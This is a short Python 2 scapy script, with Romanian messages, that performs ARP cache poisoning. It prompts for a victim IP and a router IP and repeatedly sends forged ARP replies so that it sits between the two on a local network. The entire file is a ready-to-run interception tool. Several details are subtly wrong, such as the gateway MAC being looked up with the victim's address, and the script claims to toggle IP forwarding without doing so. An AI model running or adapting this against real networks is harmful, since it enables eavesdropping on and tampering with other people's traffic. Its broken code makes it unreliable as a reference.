from scapy.all import *
import os
import signal
import sys
import threading
import time

def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def reARP():
    print "\n[*] Refacere legaturi"
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff"), hwsrc = victimMAC, count = 7)
    send(ARP(op = 2, pdst = gateIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff"), hwsrc = gateMAC, count = 7)
    print "\n[*] Oprire IP forwarding"
    sys.exit(1)
    
def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = vm))
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gm))
    
def main():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        print "Nu se gaseste adresa MAC a victimei"
        sys.exit(1)
    try:
        gateMAC = get_mac(victimIP)
    except Exception:
        print "Nu se gaseste adresa MAC a gate-ului"
        sys.exit(1)    
    while 1:
        try:
            trick(gateMAC,victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            print "\n Oprire manuala"
            reARP()
            sys.exit(1)        
        
    
try:
    victimIP = raw_input("[*] Adresa IP a victimei: ")
    gateIP = raw_input("[*] Adresa IP a routerului: ")
except KeyboardInterrupt:
    print "\n Oprire manuala"
    sys.exit(1)

print "\n[*] Pornire IP Forwarding(mid 1 are deja optiunea setata)"
main()
